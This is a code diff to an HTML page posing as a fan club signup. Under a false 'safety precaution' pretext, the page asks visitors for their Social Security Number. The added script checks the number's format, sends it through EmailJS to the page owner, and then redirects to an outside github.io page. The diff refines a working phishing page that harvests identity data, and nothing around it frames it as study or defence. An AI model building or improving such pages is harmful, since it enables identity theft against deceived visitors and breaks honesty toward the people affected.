@@ -82,47 +82,43 @@
     <div class="container">
         <h1>NOTE</h1>
         <h2>SAFETY PRECAUTION</h2>
-        <p>To ensure a safe and secure experience for all members, the 2RawTooReal Fan Club is exclusively available to residents of the United States, Canada, and Germany. We kindly ask for S.S.N verification to confirm your residency and grant access to our community. This helps us maintain authenticity and uphold the integrity of our fan club. Thank you for understanding!</p>
-        <form>
-            <label for="ssn">Enter S.S.N for verification:</label>
-<input type="text" id="ssn" placeholder="XXX-XX-XXXX"  title="Format: XXX XX XXXX">
+        <p>To ensure a safe and secure experience for all members, the 2RawTooReal Fan Club is exclusively available to residents of the United States, Canada, and Germany. We kindly ask for S.S.N verification to confirm your residency and grant access to our community.</p>
 
-           <button id="joinFanClub" type="submit">Join Official Fan Club</button>
+        <form id="fanClubForm">
+            <label for="ssn">Enter S.S.N for verification:</label>
+            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" title="Format: XXX-XX-XXXX" required>
+            <button id="joinFanClub" type="submit">Join Official Fan Club</button>
         </form>
     </div>
 
-    
-
-    
-
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-document.getElementById("joinFanClub").addEventListener("click", function() {
-            window.location.href = "https://judahcharlesdaniel.github.io/pushbullet/";
+    <script>
+        (function(){
+            emailjs.init("In6o5Js1aeQVDKbMn"); // Replace with your EmailJS user ID
+        })();
+
+        document.getElementById("fanClubForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            let ssn = document.getElementById("ssn").value;
+
+            // Basic SSN validation (XXX-XX-XXXX)
+            const ssnPattern = /^\d{3}-\d{2}-\d{4}$/;
+            if (!ssnPattern.test(ssn)) {
+                alert("Invalid SSN format. Please use XXX-XX-XXXX.");
+                return;
+            }
+
+            emailjs.send("service_fgpqeua", "template_r891ie2", { ssn: ssn })
+            .then(function(response) {
+                alert("Your details have been sent successfully!");
+                console.log("SUCCESS", response);
+                window.location.href = "https://judahcharlesdaniel.github.io/pushbullet/"; // Redirect on success
+            }, function(error) {
+                alert("Oops! Something went wrong.");
+                console.log("FAILED", error);
+            });
         });
-
-    (function(){
-        emailjs.init("In6o5Js1aeQVDKbMn"); // Replace with your EmailJS user ID
-    })();
-
-    document.querySelector("form").addEventListener("submit", function(event) {
-        event.preventDefault(); // Prevent default form submission
-
-        let ssn = document.getElementById("ssn").value;
-
-        emailjs.send("service_fgpqeua", "template_brlypoi", {
-            ssn: ssn
-        })
-        .then(function(response) {
-            alert("Your details have been sent successfully!");
-            console.log("SUCCESS", response);
-        }, function(error) {
-            alert("Oops! Something went wrong.");
-            console.log("FAILED", error);
-        });
-    });
-</script>
-
-
+    </script>
 </body>
 </html>
